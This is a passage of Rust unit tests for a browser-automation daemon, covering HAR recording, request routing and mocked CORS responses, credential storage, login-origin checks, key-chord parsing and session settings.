}

#[tokio::test]
async fn steps_list_failed_commands_and_close_reports_unsaved() {
    let mut state = DaemonState::new();
    state.flow.begin_capture(None);
    let seq = state
        .flow
        .begin(
            "click",
            &json!({ "action": "click", "selector": "#a" }),
            &RefMap::new(),
            None,
            None,
        )
        .unwrap();
    state.flow.tag(
        "r1",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs_f64(),
    );
    state
        .flow
        .end(seq, false, Some("https://a.test/".to_string()), None, None);
    let steps = handle_flow_steps(&json!({}), &state).unwrap();
    assert_eq!(steps["steps"][0]["ok"], false);
    assert_eq!(steps["steps"][0]["requests"], 1);
    assert_eq!(steps["unsaved"], 1);
    let close = handle_close(&mut state).await.unwrap();
    assert_eq!(close["unsaved"]["steps"], 1);
    assert!(!state.flow.active());
}

#[tokio::test]
async fn test_handle_har_stop_can_retry_after_write_failure() {
    let dir = tempfile::tempdir().unwrap();
    let invalid_path = dir.path().join("missing/retry.har");
    let valid_path = dir.path().join("retry.har");
    let response_body = r#"{"ok":true}"#;
    let mut state = DaemonState::new();
    state.har_recording = true;
    state.har_body_total_bytes = 123;
    state.har_entries.push(HarEntry {
        request_id: "retry-request".to_string(),
        wall_time: 1773576000.0,
        method: "POST".to_string(),
        url: "https://example.com/retry".to_string(),
        request_headers: vec![],
        post_data: Some("request body".to_string()),
        request_body_size: 12,
        resource_type: "XHR".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/1.1".to_string(),
        response_headers: vec![],
        mime_type: "application/json".to_string(),
        redirect_url: String::new(),
        response_body_size: response_body.len() as i64,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: Some(response_body.to_string()),
        response_body_base64: false,
        remote_addr: None,
    });

    let error = handle_har_stop(
        &json!({ "path": invalid_path.to_string_lossy() }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("Failed to write HAR"));
    assert!(state.har_recording);
    assert_eq!(state.har_entries.len(), 1);
    assert_eq!(
        state.har_entries[0].response_body.as_deref(),
        Some(response_body)
    );
    assert_eq!(state.har_body_total_bytes, 123);

    let result = handle_har_stop(&json!({ "path": valid_path.to_string_lossy() }), &mut state)
        .await
        .unwrap();

    assert_eq!(result["path"], valid_path.to_string_lossy().as_ref());
    assert_eq!(result["requestCount"], 1);
    assert!(!state.har_recording);
    assert!(state.har_entries.is_empty());
    assert_eq!(state.har_body_total_bytes, 0);

    let har: Value = serde_json::from_str(&fs::read_to_string(valid_path).unwrap()).unwrap();
    assert_eq!(har["log"]["entries"][0]["request"]["method"], "POST");
    assert_eq!(
        har["log"]["entries"][0]["request"]["url"],
        "https://example.com/retry"
    );
    assert_eq!(
        har["log"]["entries"][0]["request"]["postData"]["text"],
        "request body"
    );
    assert_eq!(
        har["log"]["entries"][0]["response"]["content"]["text"],
        response_body
    );
}

#[tokio::test]
async fn test_execute_har_stop_skips_browser_auto_launch() {
    let path = std::env::temp_dir().join(format!("frob-har-stop-{}.har", unix_timestamp_millis()));
    let mut state = DaemonState::new();
    state.har_entries.push(HarEntry {
        request_id: "req-3".to_string(),
        wall_time: 1773576000.0,
        method: "GET".to_string(),
        url: "https://example.com/".to_string(),
        request_headers: vec![],
        post_data: None,
        request_body_size: 0,
        resource_type: "Document".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/1.1".to_string(),
        response_headers: vec![],
        mime_type: "text/html".to_string(),
        redirect_url: String::new(),
        response_body_size: 64,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: None,
        response_body_base64: false,
        remote_addr: None,
    });

    let result = execute_command(
        &json!({
            "action": "har_stop",
            "id": "har-stop-1",
            "path": path.to_string_lossy().to_string()
        }),
        &mut state,
    )
    .await;

    assert_eq!(result["success"], true);
    assert_eq!(result["data"]["requestCount"], 1);
    let _ = fs::remove_file(path);
}

#[test]
fn test_browser_metadata_from_version_parses_product() {
    let metadata = browser_metadata_from_version(&json!({
        "product": "HeadlessChrome/123.0.6312.0"
    }))
    .unwrap();

    assert_eq!(metadata["name"], "HeadlessChrome");
    assert_eq!(metadata["version"], "123.0.6312.0");
}

#[test]
fn test_default_timeout_ms_from_env() {
    let env = EnvGuard::new(&["FROB_DEFAULT_TIMEOUT"]);
    // When FROB_DEFAULT_TIMEOUT is set, DaemonState should use it
    env.set("FROB_DEFAULT_TIMEOUT", "3000");
    let state = DaemonState::new();
    assert_eq!(state.default_timeout_ms, 3000);
}

#[test]
fn test_default_timeout_ms_fallback() {
    let env = EnvGuard::new(&["FROB_DEFAULT_TIMEOUT"]);
    // When FROB_DEFAULT_TIMEOUT is unset, DaemonState uses the
    // documented 25s default (below the CLI's 30s IPC read timeout).
    env.remove("FROB_DEFAULT_TIMEOUT");
    let state = DaemonState::new();
    assert_eq!(state.default_timeout_ms, 25_000);
}

#[tokio::test]
async fn test_execute_unknown_command() {
    let guard = EnvGuard::new(&["FROB_CDP"]);
    guard.remove("FROB_CDP");
    let mut state = DaemonState::new();
    let cmd = json!({ "action": "unknown_action_xyz", "id": "test-1" });
    let result = execute_command(&cmd, &mut state).await;
    assert_eq!(result["success"], false);
    let error_msg = result["error"].as_str().unwrap();
    assert!(
        error_msg.contains("Not yet implemented") || error_msg.contains("Auto-launch failed"),
        "Unexpected error: {}",
        error_msg
    );
}

#[test]
fn test_auto_launch_error_context_distinguishes_cdp_connections() {
    assert_eq!(auto_launch_error_context(true), "CDP connection failed");
    assert_eq!(auto_launch_error_context(false), "Auto-launch failed");
}

#[tokio::test]
async fn test_execute_command_reports_cdp_connection_context() {
    let guard = EnvGuard::new(&["FROB_CDP"]);
    guard.remove("FROB_CDP");
    let mut state = DaemonState::new();
    state.settings.set(Key::Cdp, json!("invalid-cdp-target"));
    let cmd = json!({ "action": "snapshot", "id": "cdp-error-context" });

    let result = execute_command(&cmd, &mut state).await;

    assert_eq!(result["success"], false);
    assert!(result["error"]
        .as_str()
        .unwrap()
        .starts_with("CDP connection failed: Invalid CDP target:"));
}

#[tokio::test]
async fn test_execute_empty_action() {
    let mut state = DaemonState::new();
    let cmd = json!({ "id": "test-2" });
    let result = execute_command(&cmd, &mut state).await;
    // Empty action triggers auto-launch which will fail without a browser
    assert_eq!(result["success"], false);
}

#[tokio::test]
async fn test_execute_close_without_browser() {
    let mut state = DaemonState::new();
    let cmd = json!({ "action": "close", "id": "test-3" });
    let result = execute_command(&cmd, &mut state).await;
    assert_eq!(result["success"], true);
    assert_eq!(result["data"]["closed"], true);
}

#[tokio::test]
async fn test_navigate_without_browser() {
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }
    let cmd = json!({
        "action": "navigate",
        "url": "https://blocked.com",
        "id": "test-4"
    });
    let result = execute_command(&cmd, &mut state).await;
    // Will fail because auto-launch fails, but the domain filter won't block since
    // auto-launch happens first
    assert_eq!(result["success"], false);
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn test_credentials_roundtrip_via_actions() {
    let _lock = crate::native::auth::AUTH_TEST_MUTEX.lock().unwrap();
    let key_var = "FROB_ENCRYPTION_KEY";
    let original = std::env::var(key_var).ok();
    // SAFETY: AUTH_TEST_MUTEX serializes all test access so no concurrent mutation.
    unsafe { std::env::set_var(key_var, "a".repeat(64)) };

    let mut state = DaemonState::new();

    let set_cmd = json!({
        "action": "credentials_set",
        "name": "test-cred-action",
        "username": "user",
        "password": "pass",
        "id": "c1"
    });
    let result = execute_command(&set_cmd, &mut state).await;
    assert_eq!(result["success"], true);

    let get_cmd = json!({
        "action": "credentials_get",
        "name": "test-cred-action",
        "id": "c2"
    });
    let result = execute_command(&get_cmd, &mut state).await;
    assert_eq!(result["success"], true);
    assert_eq!(result["data"]["username"], "user");

    let list_cmd = json!({ "action": "credentials_list", "id": "c3" });
    let result = execute_command(&list_cmd, &mut state).await;
    assert_eq!(result["success"], true);

    let del_cmd = json!({
        "action": "credentials_delete",
        "name": "test-cred-action",
        "id": "c4"
    });
    let result = execute_command(&del_cmd, &mut state).await;
    assert_eq!(result["success"], true);

    // SAFETY: AUTH_TEST_MUTEX serializes all test access so no concurrent mutation.
    match original {
        Some(val) => unsafe { std::env::set_var(key_var, val) },
        None => unsafe { std::env::remove_var(key_var) },
    }
}

#[tokio::test]
async fn test_state_list_via_actions() {
    let mut state = DaemonState::new();
    let cmd = json!({ "action": "state_list", "id": "s1" });
    let result = execute_command(&cmd, &mut state).await;
    assert_eq!(result["success"], true);
    assert!(result["data"]["files"].is_array());
}

#[tokio::test]
async fn test_build_fetch_patterns_empty_state() {
    let state = DaemonState::new();
    let patterns = build_fetch_patterns(&state).await;
    assert!(
        patterns.is_empty(),
        "No routes/filters/headers → no patterns"
    );
}

fn route(pattern: &str, types: &[&str], response: bool, abort: bool) -> RouteEntry {
    RouteEntry {
        url_pattern: pattern.to_string(),
        response: response.then(|| RouteResponse {
            status: Some(201),
            body: Some(pattern.to_string()),
            content_type: None,
            headers: None,
            allow_origin: None,
        }),
        abort,
        resource_types: types.iter().map(|t| t.to_string()).collect(),
    }
}

#[test]
fn test_route_selection_table() {
    let order = "http://h/api/order";
    // (routes, url, resource type, expected body, "abort", or none)
    let cases: Vec<(Vec<RouteEntry>, &str, &str, Option<&str>)> = vec![
        (
            vec![route("*/api/order", &["fetch"], true, false)],
            order,
            "XHR",
            None,
        ),
        (
            vec![route("*/api/order", &["xhr"], true, false)],
            order,
            "XHR",
            Some("*/api/order"),
        ),
        (
            vec![route("*/api/order", &["XHR"], true, false)],
            order,
            "XHR",
            Some("*/api/order"),
        ),
        (
            vec![route("*/api/order", &[], true, false)],
            order,
            "XHR",
            Some("*/api/order"),
        ),
        (
            vec![route("*/api/order", &["document"], true, false)],
            order,
            "XHR",
            None,
        ),
        (
            vec![route("*/api/other", &[], true, false)],
            order,
            "XHR",
            None,
        ),
        (
            vec![route("*/api/order", &[], false, true)],
            order,
            "XHR",
            Some("abort"),
        ),
        // a matching route with no response and no abort does not stop the scan
        (
            vec![
                route("*/api/*", &[], false, false),
                route("*/api/order", &[], true, false),
            ],
            order,
            "XHR",
            Some("*/api/order"),
        ),
        // the first answering route wins; a fetch-only route earlier is skipped
        (
            vec![
                route("*/api/order", &["fetch"], true, false),
                route("*/api/*", &["xhr"], true, false),
            ],
            order,
            "XHR",
            Some("*/api/*"),
        ),
        (
            vec![
                route("*/api/*", &[], true, false),
                route("*/api/order", &[], false, true),
            ],
            order,
            "XHR",
            Some("*/api/*"),
        ),
        // the browser's own types go through the same predicate
        (
            vec![route("*/a", &["fetch"], true, false)],
            "http://h/a",
            "Fetch",
            Some("*/a"),
        ),
        (
            vec![route("*/a", &["xhr"], true, false)],
            "http://h/a",
            "Fetch",
            None,
        ),
    ];
    for (i, (routes, url, rt, want)) in cases.iter().enumerate() {
        let got = select_route(routes, url, rt).map(|r| {
            if r.abort {
                "abort".to_string()
            } else {
                r.response.as_ref().unwrap().body.clone().unwrap()
            }
        });
        assert_eq!(got.as_deref(), *want, "case {i}");
        // The flow's direct request is classified as the page's fetch().
        if *rt == FLOW_DIRECT_RESOURCE_TYPE {
            let flow = flow_route_answer(routes, url).map(|r| {
                if r.abort {
                    "abort".to_string()
                } else {
                    r.body
                }
            });
            assert_eq!(flow.as_deref(), *want, "flow case {i}");
        }
    }
}

#[tokio::test]
async fn test_build_fetch_patterns_with_routes() {
    let state = DaemonState::new();
    {
        let mut routes = state.routes.write().await;
        routes.push(super::RouteEntry {
            url_pattern: "https://example.com/*".to_string(),
            response: None,
            abort: true,
            resource_types: Vec::new(),
        });
    }
    let patterns = build_fetch_patterns(&state).await;
    assert_eq!(patterns.len(), 1);
    assert_eq!(patterns[0]["urlPattern"], "https://example.com/*");
}

#[test]
fn test_route_url_matches_multi_wildcard_patterns() {
    assert!(route_url_matches(
        "**/api/users",
        "https://app.example.com/v1/api/users"
    ));
    assert!(route_url_matches(
        "**/analytics/**",
        "https://cdn.example.com/analytics/event.js"
    ));
    assert!(route_url_matches(
        "https://example.com/*/users",
        "https://example.com/api/users"
    ));
    assert!(!route_url_matches(
        "**/api/users",
        "https://app.example.com/v1/api/users/42"
    ));
    assert!(!route_url_matches(
        "**/analytics/**",
        "https://cdn.example.com/static/event.js"
    ));
}

// wait --url delegates to route_url_matches against the full location.href.
#[test]
fn test_wait_url_matches_full_dev_server_urls() {
    assert!(route_url_matches(
        "**/the-edge-of-the-page",
        "http://localhost:3001/the-edge-of-the-page"
    ));
    assert!(route_url_matches(
        "**/dashboard",
        "http://localhost:3000/dashboard"
    ));
    assert!(route_url_matches(
        "/dashboard",
        "http://localhost:3000/dashboard"
    ));
    assert!(!route_url_matches(
        "**/dashboard",
        "http://localhost:3000/settings"
    ));
}

#[tokio::test]
async fn test_build_fetch_patterns_collapses_repeated_wildcards() {
    let state = DaemonState::new();
    {
        let mut routes = state.routes.write().await;
        routes.push(super::RouteEntry {
            url_pattern: "**/api/users".to_string(),
            response: None,
            abort: true,
            resource_types: Vec::new(),
        });
    }
    let patterns = build_fetch_patterns(&state).await;
    assert_eq!(patterns.len(), 1);
    assert_eq!(patterns[0]["urlPattern"], "*/api/users");
}

#[test]
fn test_parse_route_response_from_nested_response() {
    let response = parse_route_response(&json!({
        "response": {
            "status": 201,
            "body": "{\"ok\":true}",
            "contentType": "application/json",
            "headers": { "x-test": "yes" }
        }
    }))
    .expect("response should parse");

    assert_eq!(response.status, Some(201));
    assert_eq!(response.body.as_deref(), Some("{\"ok\":true}"));
    assert_eq!(response.content_type.as_deref(), Some("application/json"));
    assert_eq!(
        response
            .headers
            .as_ref()
            .and_then(|headers| headers.get("x-test"))
            .map(String::as_str),
        Some("yes")
    );
}

fn header_value<'a>(headers: &'a [Value], name: &str) -> Option<&'a str> {
    headers
        .iter()
        .find(|h| h["name"].as_str() == Some(name))
        .and_then(|h| h["value"].as_str())
}

#[test]
fn test_mocked_response_passes_cors_for_cross_origin_requests() {
    let resp = RouteResponse {
        status: None,
        body: Some(r#"{"mock":true}"#.to_string()),
        content_type: None,
        headers: None,
        allow_origin: Some("https://www.example.com".to_string()),
    };
    let request = json!({ "Origin": "https://www.example.com" });
    let (status, headers, body) = mocked_response(&resp, request.as_object());
    assert_eq!(status, 200);
    assert!(!body.is_empty());
    assert_eq!(
        header_value(&headers, "Content-Type"),
        Some("application/json")
    );
    assert_eq!(
        header_value(&headers, "Access-Control-Allow-Origin"),
        Some("https://www.example.com")
    );

    let preflight = json!({
        "Referer": "https://www.example.com/page",
        "Access-Control-Request-Method": "POST",
        "Access-Control-Request-Headers": "content-type,x-client",
    });
    let (status, headers, body) = mocked_response(&resp, preflight.as_object());
    assert_eq!(status, 204);
    assert!(body.is_empty());
    assert_eq!(
        header_value(&headers, "Access-Control-Allow-Origin"),
        Some("https://www.example.com")
    );
    assert_eq!(
        header_value(&headers, "Access-Control-Allow-Methods"),
        Some("POST")
    );
    assert_eq!(
        header_value(&headers, "Access-Control-Allow-Headers"),
        Some("content-type,x-client")
    );
}

#[test]
fn test_mocked_response_gives_other_origins_no_cors() {
    let resp = RouteResponse {
        status: None,
        body: Some(r#"{"private":true}"#.to_string()),
        content_type: None,
        headers: None,
        allow_origin: Some("https://www.example.com".to_string()),
    };
    let request = json!({ "Origin": "https://attacker.test" });
    let (_, headers, _) = mocked_response(&resp, request.as_object());
    assert!(header_value(&headers, "Access-Control-Allow-Origin").is_none());
    let preflight = json!({
        "Origin": "https://attacker.test",
        "Access-Control-Request-Method": "GET",
    });
    let (status, _, _) = mocked_response(&resp, preflight.as_object());
    assert_eq!(status, 200);

    let closed = RouteResponse {
        allow_origin: None,
        ..resp
    };
    let request = json!({ "Origin": "https://www.example.com" });
    let (_, headers, _) = mocked_response(&closed, request.as_object());
    assert!(header_value(&headers, "Access-Control-Allow-Origin").is_none());
    assert_eq!(
        header_value(&headers, "Content-Type"),
        Some("application/json")
    );
}

#[test]
fn test_mocked_response_does_not_duplicate_route_headers() {
    let mut own = HashMap::new();
    own.insert(
        "Access-Control-Allow-Credentials".to_string(),
        "true".to_string(),
    );
    own.insert(
        "content-type".to_string(),
        "application/vnd.api+json".to_string(),
    );
    let resp = RouteResponse {
        status: None,
        body: Some(r#"{"a":1}"#.to_string()),
        content_type: None,
        headers: Some(own),
        allow_origin: Some("https://www.example.com".to_string()),
    };
    let request = json!({ "Origin": "https://www.example.com" });
    let (_, headers, _) = mocked_response(&resp, request.as_object());
    let count = |name: &str| {
        headers
            .iter()
            .filter(|h| {
                h["name"]
                    .as_str()
                    .is_some_and(|n| n.eq_ignore_ascii_case(name))
            })
            .count()
    };
    assert_eq!(count("Access-Control-Allow-Credentials"), 1);
    assert_eq!(count("Content-Type"), 1);
    assert_eq!(count("Access-Control-Allow-Origin"), 1);
}

#[test]
fn test_mocked_response_keeps_explicit_cors_and_content_type() {
    let mut own = HashMap::new();
    own.insert("Access-Control-Allow-Origin".to_string(), "*".to_string());
    let resp = RouteResponse {
        status: Some(201),
        body: Some("plain".to_string()),
        content_type: Some("text/plain".to_string()),
        headers: Some(own),
        allow_origin: None,
    };
    let request = json!({ "Origin": "https://www.example.com" });
    let (status, headers, _) = mocked_response(&resp, request.as_object());
    assert_eq!(status, 201);
    assert_eq!(header_value(&headers, "Content-Type"), Some("text/plain"));
    assert_eq!(
        headers
            .iter()
            .filter(|h| h["name"] == "Access-Control-Allow-Origin")
            .count(),
        1
    );
    let (_, headers, _) = mocked_response(&resp, None);
    assert!(header_value(&headers, "Access-Control-Allow-Credentials").is_none());
}

#[test]
fn test_parse_route_response_accepts_legacy_top_level_body() {
    let response = parse_route_response(&json!({ "body": "{\"users\":[]}" }))
        .expect("legacy body should parse");

    assert_eq!(response.status, None);
    assert_eq!(response.body.as_deref(), Some("{\"users\":[]}"));
    assert_eq!(response.content_type, None);
    assert_eq!(response.headers, None);
    assert_eq!(response.allow_origin, None);
}

#[tokio::test]
async fn test_build_fetch_patterns_adds_wildcard_for_domain_filter() {
    let state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(super::super::network::DomainFilter::new("example.com"));
    }
    let patterns = build_fetch_patterns(&state).await;
    assert_eq!(patterns.len(), 1);
    assert_eq!(patterns[0]["urlPattern"], "*");
}

#[tokio::test]
async fn test_build_fetch_patterns_adds_wildcard_for_origin_headers() {
    let state = DaemonState::new();
    {
        let mut oh = state.origin_headers.write().await;
        let mut headers = HashMap::new();
        headers.insert("Authorization".to_string(), "Bearer xxx".to_string());
        oh.insert("http://example.com".to_string(), headers);
    }
    let patterns = build_fetch_patterns(&state).await;
    assert_eq!(patterns.len(), 1);
    assert_eq!(patterns[0]["urlPattern"], "*");
}

#[tokio::test]
async fn test_build_fetch_patterns_no_duplicate_wildcard() {
    let state = DaemonState::new();
    {
        let mut routes = state.routes.write().await;
        routes.push(super::RouteEntry {
            url_pattern: "*".to_string(),
            response: None,
            abort: false,
            resource_types: Vec::new(),
        });
    }
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(super::super::network::DomainFilter::new("example.com"));
    }
    let patterns = build_fetch_patterns(&state).await;
    assert_eq!(
        patterns.len(),
        1,
        "Should not add a second wildcard when routes already contain one"
    );
}

#[test]
fn test_auth_login_waits_for_load_event() {
    use super::super::browser::WaitUntil;
    assert_eq!(
        super::AUTH_LOGIN_WAIT_UNTIL,
        WaitUntil::Load,
        "auth_login should navigate with Load and then wait for form \
             selectors explicitly"
    );
}

#[test]
fn test_auth_login_origin_ignores_path_query_and_fragment() {
    let first = auth_login_origin(
        "https://example.com/login?credential-path-sentinel#credential-fragment-sentinel",
        "credential",
    )
    .unwrap();
    let second = auth_login_origin(
        "https://example.com/consent?current-path-sentinel#current-fragment-sentinel",
        "current page",
    )
    .unwrap();
    assert_eq!(first, second);
    assert_eq!(first.0, "https://example.com");
}

#[test]
fn test_auth_login_origin_normalizes_default_ports() {
    assert_eq!(
        auth_login_origin("http://example.com:80/login", "credential").unwrap(),
        auth_login_origin("http://example.com/flow", "current page").unwrap()
    );
    assert_eq!(
        auth_login_origin("https://example.com:443/login", "credential").unwrap(),
        auth_login_origin("https://example.com/flow", "current page").unwrap()
    );
}

#[test]
fn test_auth_login_origin_rejects_mismatched_origins() {
    let expected = auth_login_origin("https://example.com/login", "credential").unwrap();
    assert_ne!(
        expected,
        auth_login_origin("http://example.com/login", "current page").unwrap()
    );
    assert_ne!(
        expected,
        auth_login_origin("https://id.example.com/login", "current page").unwrap()
    );
    assert_ne!(
        expected,
        auth_login_origin("https://example.com:8443/login", "current page").unwrap()
    );
}

#[test]
fn test_auth_login_origin_rejects_malformed_opaque_and_non_http_urls() {
    for value in [
        "not a url",
        "about:blank",
        "data:text/html,login",
        "file:///tmp/login.html",
        "https://",
        "https:///login",
        "https:example.com/login",
    ] {
        let error = auth_login_origin(value, "credential").unwrap_err();
        assert!(error.contains("absolute HTTP(S) URL with a host"));
        assert!(!error.contains(value));
    }
}

#[test]
fn test_auth_login_origin_mismatch_error_is_sanitized() {
    let current = auth_login_origin(
            "https://login.example.com/current-path-sentinel?current-query-sentinel#current-fragment-sentinel",
            "current page",
        )
        .unwrap();
    let expected = auth_login_origin(
            "https://example.com/credential-path-sentinel?credential-query-sentinel#credential-fragment-sentinel",
            "credential",
        )
        .unwrap();
    let error = ensure_auth_login_origin_matches(&current, &expected).unwrap_err();

    assert_eq!(
            error,
            "Current page origin https://login.example.com does not match credential origin https://example.com"
        );
    for sentinel in [
        "current-path-sentinel",
        "current-query-sentinel",
        "current-fragment-sentinel",
        "credential-path-sentinel",
        "credential-query-sentinel",
        "credential-fragment-sentinel",
    ] {
        assert!(!error.contains(sentinel));
    }
}

#[test]
fn test_parse_key_chord_plain_key() {
    let (key, mods) = parse_key_chord("a");
    assert_eq!(key, "a");
    assert_eq!(mods, None);
}

#[test]
fn test_parse_key_chord_enter() {
    let (key, mods) = parse_key_chord("Enter");
    assert_eq!(key, "Enter");
    assert_eq!(mods, None);
}

#[test]
fn test_parse_key_chord_control_a() {
    let (key, mods) = parse_key_chord("Control+a");
    assert_eq!(key, "a");
    assert_eq!(mods, Some(2));
}

#[test]
fn test_parse_key_chord_ctrl_alias() {
    let (key, mods) = parse_key_chord("Ctrl+c");
    assert_eq!(key, "c");
    assert_eq!(mods, Some(2));
}

#[test]
fn test_parse_key_chord_shift_enter() {
    let (key, mods) = parse_key_chord("Shift+Enter");
    assert_eq!(key, "Enter");
    assert_eq!(mods, Some(8));
}

#[test]
fn test_parse_key_chord_control_shift_a() {
    let (key, mods) = parse_key_chord("Control+Shift+a");
    assert_eq!(key, "a");
    assert_eq!(mods, Some(2 | 8));
}

#[test]
fn test_parse_key_chord_meta_a() {
    let (key, mods) = parse_key_chord("Meta+a");
    assert_eq!(key, "a");
    assert_eq!(mods, Some(4));
}

#[test]
fn test_parse_key_chord_alt_tab() {
    let (key, mods) = parse_key_chord("Alt+Tab");
    assert_eq!(key, "Tab");
    assert_eq!(mods, Some(1));
}

#[test]
fn test_parse_key_chord_plus_key() {
    // A bare "+" should not be confused with a separator
    let (key, mods) = parse_key_chord("+");
    assert_eq!(key, "+");
    assert_eq!(mods, None);
}

#[tokio::test]
async fn test_auto_dialog_enabled_by_default() {
    let guard = EnvGuard::new(&["FROB_NO_AUTO_DIALOG"]);
    std::env::remove_var("FROB_NO_AUTO_DIALOG");
    let state = DaemonState::new();
    assert!(state.auto_dialog, "auto_dialog should be true by default");
    drop(guard);
}

#[tokio::test]
async fn test_auto_dialog_disabled_by_env() {
    let guard = EnvGuard::new(&["FROB_NO_AUTO_DIALOG"]);
    guard.set("FROB_NO_AUTO_DIALOG", "1");
    let state = DaemonState::new();
    assert!(
        !state.auto_dialog,
        "auto_dialog should be false when FROB_NO_AUTO_DIALOG=1"
    );
    drop(guard);
}

#[tokio::test]
async fn test_auto_dialog_disabled_by_env_true() {
    let guard = EnvGuard::new(&["FROB_NO_AUTO_DIALOG"]);
    guard.set("FROB_NO_AUTO_DIALOG", "true");
    let state = DaemonState::new();
    assert!(
        !state.auto_dialog,
        "auto_dialog should be false when FROB_NO_AUTO_DIALOG=true"
    );
    drop(guard);
}

#[tokio::test]
async fn test_auto_dialog_not_disabled_by_random_value() {
    let guard = EnvGuard::new(&["FROB_NO_AUTO_DIALOG"]);
    guard.set("FROB_NO_AUTO_DIALOG", "no");
    let state = DaemonState::new();
    assert!(
        state.auto_dialog,
        "auto_dialog should remain true for non-truthy env values"
    );
    drop(guard);
}

#[test]
fn test_pending_dialog_not_set_for_auto_handled_alert() {
    // Simulate what handle_browser_event does: when auto_dialog is true,
    // alert/beforeunload should NOT populate pending_dialog.
    let auto_dialog = true;
    for dialog_type in &["alert", "beforeunload"] {
        let auto_handled = auto_dialog && matches!(*dialog_type, "beforeunload" | "alert");
        assert!(
            auto_handled,
            "{dialog_type} should be auto-handled when auto_dialog is true"
        );
    }
}

#[test]
fn test_pending_dialog_set_for_confirm_prompt() {
    // confirm and prompt should NOT be auto-handled even when auto_dialog is true.
    let auto_dialog = true;
    for dialog_type in &["confirm", "prompt"] {
        let auto_handled = auto_dialog && matches!(*dialog_type, "beforeunload" | "alert");
        assert!(!auto_handled, "{dialog_type} should NOT be auto-handled");
    }
}
// === Session settings applied from a patch ===

/// A daemon state built from defaults, holding the env lock with every
/// FROB_* variable cleared so no other test's settings leak in.
fn isolated_state() -> (IsolatedEnv, DaemonState) {
    let mut names: Vec<String> = std::env::vars()
        .map(|(name, _)| name)
        .filter(|name| name.starts_with("FROB_"))
        .collect();
    if !names.iter().any(|name| name == "FROB_SOCKET_DIR") {
        names.push("FROB_SOCKET_DIR".to_string());
    }
    let refs: Vec<&str> = names.iter().map(String::as_str).collect();
    let guard = EnvGuard::new(&refs);
    for name in &refs {
        guard.remove(name);
    }
    // Session files go to a scratch directory, never the user's.
    let dir = tempfile::tempdir().unwrap();
    guard.set("FROB_SOCKET_DIR", dir.path().to_str().unwrap());
    let state = DaemonState::new();
    (
        IsolatedEnv {
            _guard: guard,
            _dir: dir,
        },
        state,
    )
}

struct IsolatedEnv {
    // Restores the environment after the directory is gone.
    _guard: EnvGuard<'static>,
    _dir: tempfile::TempDir,
}

fn patch_with(entries: Vec<(Key, Requested)>) -> Patch {
    Patch::from_entries(entries)
}

fn set_to(key: Key, value: Value) -> (Key, Requested) {
    (key, Requested::Set(value))
}

#[test]
fn test_launch_envelope_patch_names_what_the_command_sets() {
    let cmd = json!({
        "action": "launch",
        "headless": false,
        "profile": "/tmp/p",
        "args": ["--lang=en-US"],
        "cdpPort": 9222,
        "cdpHeaders": { "Authorization": "Bearer t" },
        "proxy": { "server": "http://proxy:8080", "username": "u", "password": "pw" },
        "ignoreHTTPSErrors": true,
        "allowedDomains": ["example.com"],
    });
    let patch = launch_envelope_patch(&cmd, None);

    assert_eq!(patch.value(Key::Headed), Some(&json!(true)));
    assert_eq!(patch.value(Key::Profile), Some(&json!("/tmp/p")));
    assert_eq!(patch.value(Key::Args), Some(&json!(["--lang=en-US"])));
    assert_eq!(patch.value(Key::Cdp), Some(&json!("9222")));
    assert_eq!(
        patch.value(Key::CdpHeaders),
        Some(&json!(r#"{"Authorization":"Bearer t"}"#))
    );
    assert_eq!(patch.value(Key::Proxy), Some(&json!("http://proxy:8080")));
    assert_eq!(patch.value(Key::ProxyUsername), Some(&json!("u")));
    assert_eq!(patch.value(Key::ProxyPassword), Some(&json!("pw")));
    assert_eq!(patch.value(Key::IgnoreHttpsErrors), Some(&json!(true)));
    assert_eq!(
        patch.value(Key::AllowedDomains),
        Some(&json!(["example.com"]))
    );
    assert_eq!(patch.get(Key::Provider), None);
}

#[test]
fn test_a_plain_launch_names_no_settings() {
    // Bare `open` keeps the profile and args the session runs with (#2287).
    assert!(launch_envelope_patch(&json!({ "action": "launch" }), None).is_noop());
    assert!(launch_envelope_patch(
        &json!({ "action": "launch", "plugins": [], "id": "1" }),
        Some("obscura")
    )
    .is_noop());
}

#[test]
fn test_launch_envelope_clears_the_obscura_bypass_only_for_obscura() {
    let cmd = json!({ "action": "launch", "proxyBypass": null });
    assert_eq!(
        launch_envelope_patch(&cmd, Some("obscura")).get(Key::ProxyBypass),
        Some(&Requested::Default)
    );
    assert!(launch_envelope_patch(&cmd, Some("chrome")).is_noop());
    assert_eq!(
        launch_envelope_patch(&json!({ "proxyBypass": "localhost" }), Some("obscura"))
            .value(Key::ProxyBypass),
        Some(&json!("localhost"))
    );
}

#[test]
fn test_empty_allowed_domains_in_a_launch_clear_the_list() {
    let patch = launch_envelope_patch(&json!({ "allowedDomains": [] }), None);
    assert_eq!(patch.get(Key::AllowedDomains), Some(&Requested::Default));
}

#[tokio::test]
async fn test_live_settings_apply_in_place_without_touching_the_browser() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.default_timeout_ms = 25_000;
    state.auto_dialog = true;
    let patch = patch_with(vec![
        set_to(Key::DefaultTimeout, json!(9000)),
        set_to(Key::NoAutoDialog, json!(true)),
        set_to(Key::ConfirmActions, json!("click")),
        set_to(Key::IdleTimeout, json!("120000")),
    ]);

    let outcome = apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    assert_eq!(state.default_timeout_ms, 9000);
    assert!(!state.auto_dialog);
    assert!(state.confirm_actions.is_some());
    assert_eq!(state.idle_activity.timeout().map(|t| t.ms), Some(120_000));
    assert_eq!(state.settings.default_timeout_ms(), 9000);
    assert!(!outcome.relaunched_browser);
    assert_eq!(outcome.changes.len(), 4);
    assert!(outcome
        .changes
        .iter()
        .all(|c| c["effect"] == "live" && c["applied"] == true));
}

#[tokio::test]
async fn test_action_policy_change_replaces_the_loaded_policy() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("policy.json");
